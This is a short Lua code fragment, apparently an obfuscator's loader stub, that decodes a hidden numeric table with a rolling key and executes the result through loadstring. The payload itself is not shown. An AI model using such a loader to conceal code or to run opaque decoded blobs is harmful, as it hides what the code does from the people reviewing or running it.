    local function VM_OI0O1I(d, k, m)
        local R_I10I = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_I10I, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_I10I)
    end

    -- Execution Guard
    local F_IOI0 = loadstring(VM_OI0O1I(B_1I0l, 27, 5))
    if F_IOI0 then
        F_IOI0(...)
    end
